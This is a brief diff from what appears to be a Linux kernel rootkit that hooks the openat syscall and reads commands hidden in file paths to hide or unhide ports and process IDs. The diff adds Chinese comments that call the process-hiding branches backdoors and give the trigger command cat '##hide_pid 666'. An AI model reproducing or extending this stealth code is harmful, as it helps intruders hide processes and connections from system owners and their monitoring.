@@ -58,6 +58,8 @@ static long my_sys_openat(const struct pt_regs *regs)
                 pr_info("parse unhide port command fail.");
             }
         }
+        //下面三个分别是hide_pid  unhide_pid unhide_all_pid 的后门
+        //使用: cat '##hide_pid 666'
         else if (strncmp(command, HIDE_PID, strlen(HIDE_PID)) == 0){
             if (sscanf(&command[strlen(HIDE_PID) + 1], "%d", &pid_num) == 1)
             {
